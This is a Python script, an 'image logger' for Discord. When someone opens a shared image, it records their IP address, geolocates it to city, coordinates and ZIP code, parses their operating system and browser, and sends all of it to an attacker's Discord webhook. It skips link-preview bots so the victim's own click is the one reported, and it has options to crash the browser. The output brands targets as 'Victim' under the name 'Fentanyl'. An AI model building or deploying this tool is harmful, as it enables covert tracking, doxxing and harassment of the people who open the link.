# Discord Image Logger - Modified & Fixed

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/your-webhook-url",
    "image": "https://example.com/image.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned.",
        "richMessage": True
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```"
            }
        ]
    })

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "Fentanyl",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Fentanyl strikes again!",
                "color": 16711803,
                "description": "A Victim opened the original Image. You can find their info below.",
                "author": {"name": "Fentanyl"},
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                        "inline": True
                    },
                    {
                        "name": "Advanced Info",
                        "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** ```yaml\n{useragent}\n```",
                        "inline": False
                    }
                ]
            }
        ]
    }

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"
                    }
                ]
            })
        return

    try:
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        city = r.get("city", "N/A")
        reg = r.get("regionName", "N/A")
        country = r.get("country", "N/A")
        loc = f"{r.get('lat', 'N/A')}, {r.get('lon', 'N/A')}"
        org = r.get("org", "N/A")
        postal = r.get("zip", "N/A")
        parsed = httpagentparser.detect(useragent)
        os = parsed.get("os", {}).get("name", "N/A")
        browser = parsed.get("browser", {}).get("name", "N/A")
    except Exception as e:
        reportError(str(e))
        return

    embed = formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser)
    requests.post(config["webhook"], json=embed)

# Example call
# makeReport("8.8.8.8", "Mozilla/5.0 ...", endpoint="/track/image.jpg")
